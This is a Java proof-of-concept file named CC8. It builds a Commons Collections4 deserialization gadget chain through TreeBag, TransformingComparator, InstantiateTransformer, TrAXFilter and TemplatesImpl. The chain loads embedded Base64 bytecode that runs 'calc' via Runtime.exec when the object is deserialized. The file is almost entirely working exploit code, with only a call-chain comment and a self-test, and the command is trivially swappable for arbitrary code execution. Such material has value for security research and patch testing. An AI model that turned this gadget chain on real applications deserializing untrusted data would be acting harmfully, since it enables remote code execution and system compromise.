package org.example.CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

/*
* TreeBag.readObject()
*  ->AbstractMapBag.doReadObject()
*   ->TreeMap.put()
*    ->TransformingComparator.compare()
*     ->ChainTransformer.transform()
*      ->InstantiateTransformer.transform()
*       ->TrAXFilter.TrAXFilter()
*        ->TemplatesImpl.newTransformer()
*         ->TemplatesImpl.getTransletInstance()
*          ->TemplatesImpl.defineTransletClasses()
*           ->TemplatesImpl$TransletClassLoader.defineClass()
* */

public class CC8 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        ChainedTransformer transformerChain = new ChainedTransformer(new ConstantTransformer("3xsh0re"));
        byte[] CalcCode = Base64.getDecoder().decode(
                "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                        "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
                        "TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a" +
                        "W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx" +
                        "jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc" +
                        "GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9" +
                        "4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA" +
                        "ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM" +
                        "MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb" +
                        "HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR" +
                        "lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL" +
                        "2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA" +
                        "nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA" +
                        "AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA" +
                        "ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA" +
                        "bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl calcTemp = new TemplatesImpl();
        setFieldValue(calcTemp, "_bytecodes", new byte[][] {CalcCode});
        setFieldValue(calcTemp, "_name", "CalcTemplatesImpl");
        setFieldValue(calcTemp, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
        };
        TreeBag treeBag = new TreeBag<>(new TransformingComparator(transformerChain));
        treeBag.add("3xsh0re");
        setFieldValue(transformerChain,"iTransformers",transformers);

        // 测试
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(treeBag);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
